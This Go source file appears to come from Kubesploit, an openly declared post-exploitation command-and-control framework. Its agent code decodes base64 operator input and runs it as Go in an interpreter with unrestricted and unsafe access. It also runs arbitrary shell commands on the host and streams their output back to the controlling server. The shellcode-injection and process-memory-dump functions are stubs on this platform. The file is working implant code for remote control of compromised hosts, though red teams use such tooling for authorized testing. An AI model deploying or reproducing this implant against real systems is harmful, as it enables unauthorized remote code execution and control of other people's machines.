// +build !windows

// Kubesploit is a post-exploitation command and control framework built on top of Merlin by Russel Van Tuyl.
// This file is part of Kubesploit.
// Copyright (c) 2021 CyberArk Software Ltd. All rights reserved.

// Kubesploit is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Kubesploit is distributed in the hope that it will be useful for enhancing organizations' security.
// Kubesploit shall not be used in any malicious manner.
// Kubesploit is distributed AS-IS, WITHOUT ANY WARRANTY; including the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Kubesploit.  If not, see <http://www.gnu.org/licenses/>.

package agent

import (
	"bufio"
	b64 "encoding/base64"
	"github.com/mattn/go-shellwords"
	"github.com/traefik/yaegi/stdlib/unrestricted"
	"kubesploit/pkg/messages"
	"runtime"
        "strings"
	"time"

	// Standard
	"errors"
	"fmt"
	"github.com/traefik/yaegi/interp"
	"github.com/traefik/yaegi/stdlib"
	"github.com/traefik/yaegi/stdlib/unsafe"
	"io/ioutil"
	"os"
	"os/exec"
)

// https://github.com/containous/yaegi/blob/f19b7563ea92b5c467c9e5e325a0a5b559712473/interp/interp_file_test.go
// ExecuteCommandGoInterpreter is function used to instruct an agent to execute go code via Go interpreter ("yeagi") on the host operating system
func ExecuteCommandGoInterpreter(name string, args []string) (stdout string, stderr string) {
	/*
		argS, errS := shellwords.Parse(arg)
		if errS != nil {
			return "", fmt.Sprintf("There was an error parsing command line argments: %s\r\n%s", arg, errS.Error())
		}*/

	backupStdout := os.Stdout
	defer func() { os.Stdout = backupStdout }()
	r, w, _ := os.Pipe()
	os.Stdout = w
	//i := interp.New(interp.Options{GoPath: build.Default.GOPATH})

	i := interp.New(interp.Options{})
	i.Use(interp.Symbols)
	i.Use(stdlib.Symbols)
	i.Use(unsafe.Symbols)
	i.Use(unrestricted.Symbols)

	uDec, err := b64.StdEncoding.DecodeString(name)
	if err == nil {
		name = string(uDec)
	}

	// Check the stderr before
	_, err = i.Eval(name)
	if err != nil {
		stderr = err.Error()
	}

	for _, arg := range(args) {
		uDec, err := b64.StdEncoding.DecodeString(arg)
		if err == nil {
			arg = string(uDec)
		}

		_, err = i.Eval(arg)
		if err != nil {
			stderr = err.Error()
		}
	}

	// read stdout
	if err = w.Close(); err != nil {
		stderr += "; Failed to close the pipe: " + err.Error()
	}
	outInterp, err := ioutil.ReadAll(r)

	if err != nil {
		stderr += "; Failed to read ioutil: " + err.Error()
	}

	//fmt.Print(string(outInterp))
	stdout = string(outInterp)
	return stdout, stderr
}


func ExecuteCommandGoInterpreterProgress(name string, args []string, result messages.CmdResults, returnMessage messages.Base, agent *Agent) (stdout string, stderr string) {
	/*
		argS, errS := shellwords.Parse(arg)
		if errS != nil {
			return "", fmt.Sprintf("There was an error parsing command line argments: %s\r\n%s", arg, errS.Error())
		}*/

	var ttyName string
	if runtime.GOOS == "windows" {
		fmt.Println("*** Using `con`")
		ttyName = "con"
	} else {
		fmt.Println("*** Using `/dev/tty`")
		ttyName = "/dev/tty"
	}

	f, err := os.OpenFile(ttyName, os.O_WRONLY, 0644)
	if err != nil {
		panic(err)
	}

	defer f.Close()

	r, w, _ := os.Pipe()
	oldStdout := os.Stdout
	os.Stdout = w
	defer func() {
		os.Stdout = oldStdout
		//fmt.Println("*** DONE")
		result.Stdout = "*** DONE ***"
		returnMessage.Payload = result
		agent.sendMessage("post", returnMessage)
	}()

	fmt.Fprintln(f, "*** Stdout redirected")

	//os.Stdout = w
	//i := interp.New(interp.Options{GoPath: build.Default.GOPATH})

	i := interp.New(interp.Options{})
	i.Use(interp.Symbols)
	i.Use(stdlib.Symbols)
	i.Use(unsafe.Symbols)
	i.Use(unrestricted.Symbols)

	uDec, err := b64.StdEncoding.DecodeString(name)
	if err == nil {
		name = string(uDec)
	}

	//dat, err := ioutil.ReadFile(name)
	//fmt.Print(string(dat))

	// Check the stderr before
	go func(){
		i.Eval(name)
		//i.Eval(args[0])

		for _, arg := range(args) {
			uDec, err := b64.StdEncoding.DecodeString(arg)
			if err == nil {
				arg = string(uDec)
			}

			_, err = i.Eval(arg)
			if err != nil {
				stderr = err.Error()
			}
		}
		// To give time for the scanner to scan
		time.Sleep(4000 * time.Millisecond)
		w.Close()
		r.Close()
	}()

	c := make(chan struct{})
	go func(){c <- struct{}{}}()
	defer close(c)

	<-c
	scanner := bufio.NewScanner(r)
	returnMessage.Type = "CmdResults"
	for scanner.Scan() {
		m := scanner.Text()
		fmt.Fprintln(f, "output: " + m)


		result.Stdout = string(m)
		returnMessage.Payload = result
		agent.sendMessage("post", returnMessage)
	}

	/*
		go i.Eval(name)
		if err != nil {
			stderr = err.Error()
		}*/
	/*
		for _, arg := range(args) {
			uDec, err := b64.StdEncoding.DecodeString(arg)
			if err == nil {
				arg = string(uDec)
			}

			_, err = i.Eval(arg)
			if err != nil {
				stderr = err.Error()
			}
		}*/


	/*
		for {
			outC := make(chan string)
			go func() {
				var buf bytes.Buffer
				io.Copy(&buf, r)
				outC <- buf.String()
			}()

			// back to normal state
			w.Close()
			os.Stdout = backupStdout
			out := <-outC
			//out, _ := ioutil.ReadAll(r)

			//out := <-outC


			returnMessage.Type = "CmdResults"
			result.Stdout = string(out)
			returnMessage.Payload = result
			agent.sendMessage("post", returnMessage)
		}

		os.Stdout = backupStdout // restoring the real stdout
		// read stdout
		if err = w.Close(); err != nil {
			stderr += "; Failed to close the pipe: " + err.Error()
		}
		outInterp, err := ioutil.ReadAll(r)

		if err != nil {
			stderr += "; Failed to read ioutil: " + err.Error()
		}

	*/
	//fmt.Print(string(outInterp))
	//stdout = string(outInterp)

	return stdout, stderr
}
func ExecuteCommand(name string, arg string) (stdout string, stderr string) {
	var cmd *exec.Cmd

	argS, errS := shellwords.Parse(arg)
	if errS != nil {
		return "", fmt.Sprintf("There was an error parsing command line argments: %s\r\n%s", arg, errS.Error())
	}

	cmd = exec.Command(name, argS...) // #nosec G204

	out, err := cmd.CombinedOutput()
	stdout = string(out)
	stderr = ""

	if err != nil {
		stderr = err.Error()
	}

	return stdout, stderr
}

// ExecuteCommand is function used to instruct an agent to execute a command on the host operating system
func ExecuteCommandScriptInCommands(name string, arg string) (stdout string, stderr string) {
	var cmd *exec.Cmd

	argS, errS := shellwords.Parse(arg)
	if errS != nil {
		return "", fmt.Sprintf("There was an error parsing command line argments: %s\r\n%s", arg, errS.Error())
	}
	if len(argS) > 2 {
                name = strings.TrimSuffix(name, "\n")
		name += " " + argS[2]
		cmd = exec.Command(argS[0],argS[1],name)
		//cmd = exec.Command(argS[0],argS[1],name,"_", argS[2]) // #nosec G204
	} else {
		cmd = exec.Command(argS[0],argS[1],name) // #nosec G204
	}

	out, err := cmd.CombinedOutput()
	stdout = string(out)
	stderr = ""

	if err != nil {
		stderr = err.Error()
	}

	return stdout, stderr
}

// ExecuteShellcodeSelf executes provided shellcode in the current process
//lint:ignore SA4009 Function needs to mirror exec_windows.go and inputs must be used
func ExecuteShellcodeSelf(shellcode []byte) error {
	shellcode = nil
	return errors.New("shellcode execution is not implemented for this operating system")
}

// ExecuteShellcodeRemote executes provided shellcode in the provided target process
//lint:ignore SA4009 Function needs to mirror exec_windows.go and inputs must be used
func ExecuteShellcodeRemote(shellcode []byte, pid uint32) error {
	shellcode = nil
	pid = 0
	return errors.New("shellcode execution is not implemented for this operating system")
}

// ExecuteShellcodeRtlCreateUserThread executes provided shellcode in the provided target process using the Windows RtlCreateUserThread call
//lint:ignore SA4009 Function needs to mirror exec_windows.go and inputs must be used
func ExecuteShellcodeRtlCreateUserThread(shellcode []byte, pid uint32) error {
	shellcode = nil
	pid = 0
	return errors.New("shellcode execution is not implemented for this operating system")
}

// ExecuteShellcodeQueueUserAPC executes provided shellcode in the provided target process using the Windows QueueUserAPC API call
//lint:ignore SA4009 Function needs to mirror exec_windows.go and inputs must be used
func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
	shellcode = nil
	pid = 0
	return errors.New("shellcode execution is not implemented for this operating system")
}

// miniDump is a Windows only module function to dump the memory of the provided process
//lint:ignore SA4009 Function needs to mirror exec_windows.go and inputs must be used
func miniDump(tempDir string, process string, inPid uint32) (map[string]interface{}, error) {
	var mini map[string]interface{}
	tempDir = ""
	process = ""
	inPid = 0
	return mini, errors.New("minidump doesn't work on non-windows hosts")
}
